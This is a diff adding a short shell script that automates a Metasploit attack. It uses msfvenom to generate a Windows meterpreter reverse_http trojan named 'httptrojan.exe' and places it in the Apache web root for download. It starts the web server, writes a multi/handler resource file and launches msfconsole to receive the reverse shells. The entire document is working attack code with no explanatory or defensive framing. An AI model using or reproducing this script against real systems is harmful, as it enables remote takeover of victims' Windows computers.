@@ -1,0 +1,15 @@
+touch backdoor_http.rc
+echo "msfvenom -p windows/x64/meterpreter/reverse_http lhost=$(hostname -I) lport=51413 -f exe -o httptrojan.exe" >> backdoor_http.rc
+echo mv httptrojan.exe /var/www/html/ >> backdoor_http.rc
+echo service apache2 start >> backdoor_http.rc
+echo msfconsole -r metasploit_http.rc >> backdoor_http.rc
+chmod +x backdoor_http.rc
+
+touch metasploit_http.rc
+echo use multi/handler >> metasploit_http.rc
+echo set payload windows/x64/meterpreter/reverse_http >> metasploit_http.rc
+echo "set lhost $(hostname -I)" >> metasploit_http.rc
+echo set lport 51413 >> metasploit_http.rc
+echo run >> metasploit_http.rc
+
+./backdoor_http.rc
